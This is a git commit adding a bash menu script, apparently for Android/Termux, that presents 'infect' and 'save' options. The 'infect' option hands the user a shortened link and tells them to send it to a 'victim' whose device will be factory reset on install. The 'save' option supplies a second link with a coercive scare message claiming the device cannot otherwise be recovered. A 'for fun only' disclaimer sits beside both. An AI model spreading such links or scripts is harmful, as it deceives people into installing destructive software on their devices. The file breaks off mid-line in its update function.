9cc37f4adba3842fe4306c6b3aeef773c77de3a9
BlackStormHere <125637623+BlackStormHere@users.noreply.github.com>
2023-02-24 21:08:09 +0530

    Create infect.sh

---
+++ infect.sh
@@ -0,0 +1,237 @@
+# A tool by blackstormhere
+# Be a unique person not copy cat
+# Colours
+#----------------
+red=\e[91m"
+rset="\e[0m"
+grn="\e[92m"
+ylo="\e[93m"
+blue="\e[94m"
+cyan="\e[96m"
+pink="\e[95m"
+=----------------
+# scripting start
+banner(){
+vid
+echo -e '\e[93m
+                         __________
+                      .~#########%%;~.
+                     /############%%;`\
+                    /######/~\/~\%%;,;,\
+                   |#######\    /;;;;.,.|
+                   |#########\/%;;;;;.,.|
+          XX       |##/~~\####%;;;/~~\;,|       XX
+        XX..X      |#|  o  \##%;/  o  |.|      X..XX
+      XX.....X     |##\____/##%;\____/.,|     X.....XX
+ XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
+X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
+X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
+echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
+ X# \.X        @#%,.@                @#%,.@        
+                @#%,.@              @#%,.@          
+                  @#%,.@          @#%,.@            
+                     @#%,.@      @#%,.@             
+                       @#%.,@  @#%,.@ 
+                         BlackStorm
+'
+echo " " 
+echo -e "$red                       ▶Coded by$grn BS$red◀$rset"
+echo -e "$red                      ⫸$ylo  BLACKSTORM$red ⫷$rset"
+echo 
+# Functions
+echo -e "$red                    [Infect them with fun]$rset"
+echo " "
+echo " "
+}
+baner1(){
+clear
+echo -e '\e[93m     
+                         __________
+                      .~#########%%;~.
+                     /############%%;`\
+                    /######/~\/~\%%;,;,\
+                   |#######\    /;;;;.,.|
+                   |#########\/%;;;;;.,.|
+          XX       |##/~~\####%;;;/~~\;,|       XX
+        XX..X      |#|  o  \##%;/  o  |.|      X..XX
+      XX.....X     |##\____/##%;\____/.,|     X.....XX
+ XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
+X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
+X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
+echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
+ X# \.X        @#%,.@                @#%,.@        
+                @#%,.@              @#%,.@          
+                  @#%,.@          @#%,.@            
+                     @#%,.@      @#%,.@             
+                       @#%.,@  @#%,.@  
+                       BlackStormHere
+'
+echo " " 
+echo -e "$red                       ▶Coded by$grn BS$red◀$rset"
+echo -e "$red                      ⫸$ylo  BLACKSTORM$red ⫷$rset"
+echo 
+# Functions
+echo -e "$red                    [Infect them with fun]$rset"
+echo " "
+echo " "
+}
+menu(){
+echo -e "$grn             ＞＞＞＞>>>＞$ylo [Options]$grn ＜<<<＜＜＜＜$rset"
+echo " "
+echo " "
+echo -e "$red                        ➡$cyan [\e[92m1\e[96m] Infect now"
+echo -e "$red                        ➡$cyan [\e[92m2\e[96m] Save now"
+echo -e "$red                        ➡$cyan [\e[92m3\e[96m] About"
+echo -e "$red                        ➡$cyan [\e[92m4\e[96m] Update script "
+echo -e "$red                        ➡$cyan [\e[92m5\e[96m] Subscribe"
+echo -e "$red                        ➡$cyan [\e[92m6\e[96m] More"
+echo -e "$red                        ➡$cyan [\e[92m7\e[96m] Chat"
+echo -e "$red                        ➡$cyan [\e[92m8\e[96m] Exit"
+echo " "
+echo " "
+echo -e "$grn               >＞＞＞＞＞$ylo [SELECT]$grn ＜＜＜＜＜<$rset"
+echo " "
+echo -ne "\e[92m#SELECT OPTION\e[92m: "
+read optnz
+if [ $optnz = "1" ];
+then
+virus
+elif [ $optnz = "2" ];
+then
+save
+elif [ $optnz = "3" ];
+then
+about
+elif [ $optnz = "4" ];
+then
+upd
+elif [ $optnz = "5" ];
+then
+am start -a android.intent.action.VIEW -d https://youtube.com/@BlackStormHere > /dev/null 2>&1
+banner
+menu
+elif [ $optnz = "6" ];
+am start -a android.intent.action.VIEW -d https://github.com/BlackStormHere > /dev/null 2>&1
+banner
+menu
+elif [ $optnz = "7" ];
+then
+am start -a android.intent.action.VIEW -d https://chat.whatsapp.com/Bb83IUnEDtQ7861LSmj2Ii > /dev/null 2>&1
+banner
+menu
+elif [ $optnz = "8" ];
+then
+exit 1
+else
+echo "wrong"
+exit
+fi
+}
+virus(){
+################
+clear
+echo
+echo -e '\e[92m 
+                    _  _  _____  ____  ____ 
+                   ( \( )(  _  )(_  _)( ___)
+                    )  (  )(_)(   )(   )__) 
+                   (_)\_)(_____) (__) (____) '
+echo " "
+echo -e "\e[91m 😈  Copy below link and send it your victim and 
+say nothing to him. when he install it in his 
+device it will be factory reset and lot more happens.
+                                👇👇👇
+
+          \e[92mL1NK :- \e[96mhttps://tinyurl.com/uppdatesnew\e[91m
+
+                                 👆👆👆
+Use only for fun purpose not for harming someone 😇✌️.
+And our channel is not responsible for any kind of loss 
+you do to other's by this script."
+echo
+echo -ne "\e[92m#Type exit : "
+read exitz
+if [ $exitz = "exit" ];
+then
+banner
+menu
+else
+banner
+menu
+fi
+}
+save(){
+clear
+echo
+echo -e '\e[92m 
+                    _  _  _____  ____  ____ 
+                   ( \( )(  _  )(_  _)( ___)
+                    )  (  )(_)(   )(   )__) 
+                   (_)\_)(_____) (__) (____) '
+echo " "
+echo " "
+echo -e "\e[93m  Copy below link and send it your victim and tell him
+that he should install this application or else his 
+device will not be recovered.(Antivirus)
+                    👇👇👇
+
+        \e[92mL1NK :- \e[96mhttps://bit.ly/3fX8ljZ\e[93m
+
+                    👆👆👆
+Use only for fun purpose not for harming someone 😇✌️. 
+And our channel is not responsible for any kind of 
+loss you do to other's by this script."
+echo
+echo -ne "\e[92m#Type exit : "
+read exitz
+if [ $exitz = "exit" ];
+then
+banner
+menu
+else
+banner
+menu
+fi
+}
+about(){
+clear
+echo -e '\e[91m
+         ──▐─▌──▐─▌──
+         ─▐▌─▐▌▐▌─▐▌─
+         ─█▄▀▄██▄▀▄█─
+         ──▄──██▌─▄──
+         ▄▀─█▀██▀█─▀▄
+         ▐▌▐▌─▐▌─▐▌▐▌
+         ─▐─█────█─▌─
+         ────▌──▐────
+'
+echo -e "\e[93m               CALL ME \e[92mBLACKSTORMHERE"  | pv  -qL 10
+echo -e "\e[93m             IAM FROM \e[92mBLACKSTORM" | pv -qL 10
+echo -e "\e[93m       IM A \e[92mGEEK\e[93m WITH LOTS OF EXCITEMENT" | pv -qL 10
+echo -e "\e[93m             HOPE YOU LIKE THIS SCRIPT" | pv -qL 10
+echo -e "\e[93m         OOPS... I TALK A LOT SRY FOR THAT " | pv -qL 10
+echo -e "\e[92m                BYEE.............." | pv -qL 10
+sleep 6.0
+banner
+menu
+}
+upd(){
+if [ -d "$HOME/infect" ];
+then
+cd $HOME
+rm -rf infect
+elif [ -d "$HOME/Infect" ];
+then
+cd $HOME
+rm -rf Infect
+else
+echo
+exit 1
+fi
+cd $HOME
+sleep 1
+echo -e "         \e[96mUPDATE IS GOING ON, PLEASE WAIT FOR A WHILE...!\e[0m"
+echo
+printf "                     \e[96m["
+# While process is running...
+while git clone 
